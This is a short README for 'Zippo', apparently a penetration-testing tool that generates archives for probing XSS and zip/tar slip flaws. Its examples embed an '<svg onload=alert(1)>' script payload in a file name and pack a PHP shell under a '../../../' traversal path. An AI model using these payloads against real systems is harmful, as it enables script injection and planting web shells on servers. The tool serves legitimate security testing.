# Zippo
Zippo is a archive payload generator for testing XSS, (Zip/Tar/Gzip)slip vulnerabilities.

```
                ,.~\                                                  
             ,-`    \                                                 
             \       \                                                
              \       \                                               
               \       \                                              
                \       \                                             
       _.-------.\       \                                            
      (o| o o o | \    .-`                                            
     __||o_o_o_o|_ad-``                                               
    |``````````````|
    |     ZIPPO    |  
    |   ♠ ♠ ♠ ♠ ♠  | 
    |     ♠ ♠ ♠    |
    |       ♠      |
    |______________|
========@egeblc==========

  -i string
    	File to be archived
  -n string
    	Archived file name
  -o string
    	Output archive file name
  -t string
    	Archive type (zip/tar/gzip) (default "zip")
```

## Build

just `make` :)

## Example Usage

**TAR Archive With XSS Payload**
```
zippo -t tar -n "<svg onload=alert(1)>.txt" -o evil.tar
```
**ZIP Archive With ZIP-slip**
```
zippo -t zip -i my-shell.php -n "../../../my-shell.php" -o evil.zip
```
